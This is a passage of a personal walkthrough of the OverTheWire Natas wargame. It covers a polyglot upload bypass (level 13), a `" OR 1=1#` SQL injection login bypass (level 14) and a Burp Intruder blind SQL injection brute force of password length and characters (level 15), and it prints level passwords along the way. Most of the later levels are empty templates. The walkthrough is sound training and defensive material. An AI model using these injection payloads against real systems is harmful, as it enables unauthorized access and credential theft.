After clicking the link, we navigate to `http://natas13.natas.labs.overthewire.org/upload/xtd6xg7iv1.php` and we ontained the content: 
```
(upperpart of the image file content)
z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
(lower part of the image file content)
```

### Analysis
This level demonstrates a partial mitigation of file upload vulnerabilities using exif_imagetype(). While this check validates the file’s signature, it is still insufficient because:
- It only verifies the beginning of the file (magic bytes)
- It does not prevent additional malicious content embedded inside the file

By crafting a polyglot file (JPEG + PHP), it is possible to bypass the validation and achieve remote code execution (RCE).

Key security lessons:
- File type validation must go beyond magic bytes
- Uploaded files should not be executed by the server
- Files should be stored outside the web root
- Strict allowlists and content sanitization are required


---


## Natas 14
```
URL: http://natas14.natas.labs.overthewire.org
Username: natas14
Password:  z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
```
After login, the webpage request input for username and password along with the login button. 

Additionally, a **View Sourcecode** link was available for further inspection. Below is the content of the source code: 
```html
 <html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas14", "pass": "<censored>" };</script></head>
<body>
<h1>natas14</h1>
<div id="content">
<?php
if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas14', '<censored>');
    mysqli_select_db($link, 'natas14');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
            echo "Successful login! The password for natas15 is <censored><br>";
    } else {
            echo "Access denied!<br>";
    }
    mysqli_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password"><br>
<input type="submit" value="Login" />
</form>
<?php } ?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

### Finding 
By analyzing the source code, the following SQL query is constructed:
```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
```
User input is directly concatenated into the SQL query without any sanitization or parameterization. This introduces a SQL Injection vulnerability.

### Approach 
To exploit this vulnerability, the payload `" OR 1=1#` was used in the username field, the password field can be left empty or filled with any value, and the button login is clicked. 

### Resulting SQL Query
```sql
SELECT * from users where username="" OR 1=1# " and password=""
```
Explanation:
- " closes the original string
- OR 1=1 makes the condition always true
- # comments out the remaining part of the query

This causes the query to return at least one valid row, bypassing authentication.

### Exploitation
After submitting the payload, the server responded with: `Successful login! The password for natas15 is SdqIqBsFcz3yotlNYErZSZwblkm0lrvx`. This confirms that authentication was successfully bypassed using SQL Injection.


### Analysis
This level demonstrates a classic SQL Injection (SQLi) vulnerability caused by improper handling of user input.

Key issues:
- Direct concatenation of user input into SQL queries
- No input validation or sanitization
- Absence of prepared statements

Security implications:
- Authentication bypass
- Unauthorized data access
- Potential database compromise

Recommended mitigations:
- Use prepared statements (parameterized queries)
- Apply proper input validation and escaping
- Avoid exposing database queries in debug mode

---


## Natas 15
```
URL: http://natas15.natas.labs.overthewire.org
Username: natas15
Password: SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
```
After login, the webpage request input for username along with the `Check existance` button. 

Additionally, a **View Sourcecode** link was available for further inspection. Below is the content of the source code: 
```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas15", "pass": "<censored>" };</script></head>
<body>
<h1>natas15</h1>
<div id="content">
<?php

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas15', '<censored>');
    mysqli_select_db($link, 'natas15');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysqli_query($link, $query);
    if($res) {
    if(mysqli_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }

    mysqli_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
<input type="submit" value="Check existence" />
</form>
<?php } ?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```


### Approach 

we use payload `natas16" AND LENGTH(password)=32#` as the input for username and intercept it using burpsuite. 
request content
POST /index.php HTTP/1.1
Host: natas15.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 51
Origin: http://natas15.natas.labs.overthewire.org
Authorization: Basic bmF0YXMxNTpTZHFJcUJzRmN6M3lvdGxOWUVyWlNad2Jsa20wbHJ2eA==
Connection: keep-alive
Referer: http://natas15.natas.labs.overthewire.org/
Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007
Upgrade-Insecure-Requests: 1

username=natas16%22+AND+LENGTH%28password%29%3D§1§%23

username=natas16%22+AND+LENGTH%28password%29%3D`§1§`%23
anchor this as the things want to brute force

payload sets >> payload type: Numbers
payload settings >> from: 1 && To:40 && Step:1
number format >> base: Decimal && Min integer digits: 1 && Max integer digit:2

click the butotn start attack at the right top corner. 

identify the payload used which return the unique response with other payload. The unique response ontained is like below which generated by payload 32. 
response content 
HTTP/1.1 200 OK
Date: Wed, 15 Apr 2026 13:45:26 GMT
Server: Apache/2.4.58 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 913
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas15", "pass": "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx" };</script></head>
<body>
<h1>natas15</h1>
<div id="content">
This user exists.<br><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>

therefore, we can know that the length of the password will be 32

then we use payload `natas16" AND SUBSTRING(password,1,1)="a"#` as input for username and intercept this using burpsuite. 
payload position 
POST /index.php HTTP/1.1
Host: natas15.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Origin: http://natas15.natas.labs.overthewire.org
Authorization: Basic bmF0YXMxNTpTZHFJcUJzRmN6M3lvdGxOWUVyWlNad2Jsa20wbHJ2eA==
Connection: keep-alive
Referer: http://natas15.natas.labs.overthewire.org/
Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007
Upgrade-Insecure-Requests: 1

username=natas16%22+AND+BINARY+SUBSTRING%28password%2C1%2C1%29%3D%22§a§%22%23

username=natas16%22+AND+BINARY+SUBSTRING%28password%2C`1`%2C1%29%3D%22`§a§`%22%23


### Finding 

### Analysis

---


## Natas 16
```
URL: http://natas16.natas.labs.overthewire.org
Username: natas16
Password: hpkjKYviLQctEW33QmuXL6eDVfMW4sGo
```
After login, the following note is displayed: 

### Approach 

### Finding 

### Analysis

---


## Natas 17
```
URL: http://natas17.natas.labs.overthewire.org
Username: natas17
Password: 
```
After login, the following note is displayed: 

### Approach 

### Finding 

### Analysis

---


## Natas 18
```
URL: http://natas18.natas.labs.overthewire.org
Username: natas18
Password: 
```
After login, the following note is displayed: 

### Approach 

### Finding 

### Analysis

---


## Natas 19
```
URL: http://natas19.natas.labs.overthewire.org
Username: natas19
Password: 
```
After login, the following note is displayed: 

### Approach 

### Finding 

### Analysis

---


## Natas 20
```
URL: http://natas20.natas.labs.overthewire.org
Username: natas20
Password: 
```
After login, the following note is displayed: 

### Approach 

### Finding 

### Analysis

---


## Natas 21
```
URL: http://natas21.natas.labs.overthewire.org
Username: natas21
Password: 
```
After login, the following note is displayed: 

### Approach 

### Finding 

### Analysis

---


## Natas 22
```
URL: http://natas22.natas.labs.overthewire.org
Username: natas22
Password: 
```
After login, the following note is displayed: 

### Approach 

### Finding 

### Analysis

---


## Natas 23
```
URL: http://natas23.natas.labs.overthewire.org
Username: natas23
Password: 
```
After login, the following note is displayed: 

### Approach 

### Finding 

### Analysis

---


## Natas 24
```
URL: http://natas24.natas.labs.overthewire.org
Username: natas24
Password: 
```
After login, the following note is displayed: 

### Approach 

### Finding 

### Analysis

---


## Natas 25
```
URL: http://natas25.natas.labs.overthewire.org
Username: natas25
Password: 
```
After login, the following note is displayed: 

### Approach 

### Finding 

### Analysis

---


## Natas 26
```
URL: http://natas26.natas.labs.overthewire.org
Username: natas26
Password: 
```
After login, the following note is displayed: 

### Approach 

### Finding 

### Analysis

---


## Natas 27
```
URL: http://natas27.natas.labs.overthewire.org
Username: natas27
Password: 
```
After login, the following note is displayed: 

### Approach 

### Finding 

### Analysis

---


## Natas 28
```
URL: http://natas28.natas.labs.overthewire.org
Username: natas28
Password: 
```
After login, the following note is displayed: 

### Approach 

### Finding 

### Analysis

---


## Natas 29
```
URL: http://natas29.natas.labs.overthewire.org
Username: natas29
Password: 
```
After login, the following note is displayed: 

### Approach 

### Finding 

### Analysis

---


## Natas 30
```
URL: http://natas30.natas.labs.overthewire.org
Username: natas30
Password: 
```
After login, the following note is displayed: 

### Approach 

### Finding 

### Analysis

---


## Natas 31
```
URL: http://natas31.natas.labs.overthewire.org
Username: natas31
Password: 
```
After login, the following note is displayed: 

### Approach 

### Finding 

### Analysis

---


## Natas 2
```
URL: http://natas2.natas.labs.overthewire.org
Username: natas2
Password: 
```
After login, the following note is displayed: 

### Approach 

### Finding 

### Analysis

---


## Natas 2
```
URL: http://natas2.natas.labs.overthewire.org
Username: natas2
Password: 
```
After login, the following note is displayed: 

### Approach 

### Finding 

### Analysis

---


